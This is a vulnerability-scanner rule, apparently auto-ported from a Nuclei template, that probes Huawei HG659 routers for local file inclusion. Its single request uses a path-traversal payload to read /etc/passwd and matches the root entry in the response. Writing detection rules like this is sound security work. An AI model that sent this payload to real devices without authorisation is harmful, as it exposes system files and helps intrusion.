schema_version: 1
id: "cortex.community:huawei-hg659-lfi"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "http.preserve_raw_path.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "HUAWEI HG659 - Local File Inclusion"
  description: "HUAWEI HG659 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://twitter.com/sec715/status/1406782172443287559"
  cwes: [22]
  tags: ["lfi", "huawei", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/lib///....//....//....//....//....//....//....//....//etc//passwd", path_mode: "preserve_raw" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
